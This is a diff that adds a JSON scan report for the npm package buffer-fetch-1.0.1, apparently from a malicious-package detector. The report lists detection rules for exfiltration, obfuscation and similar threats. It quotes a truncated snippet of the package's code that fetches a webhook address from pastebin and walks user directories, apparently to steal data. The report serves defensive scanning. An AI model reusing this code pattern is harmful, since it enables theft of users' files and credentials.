@@ -1,0 +1,22 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "npm-exec-base64": {},
+        "npm-install-script": {},
+        "npm-serialize-environment": {},
+        "npm-silent-process-execution": {},
+        "npm-dll-hijacking": {},
+        "npm-steganography": {},
+        "npm-obfuscation": {},
+        "shady-links": [
+            {
+                "location": "package/Index.js:1",
+                "code": "const fs=require(\"fs\"),axios=require(\"axios\"),fetch=require(\"node-fetch\"),webhook=async()=>(await axios.get(\"https://pastebin.com/raw/Su4ip2LB\").catch((()=>{}))).data;var paths=[`${__dirname.split(\":\")[0]}:/Users/${__dirname.split(\"\\\\\")[2]}...s()}))}));",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "npm-exfiltrate-sensitive-data": {}
+    },
+    "path": "./dataset/npm/buffer-fetch-1.0.1"
+}
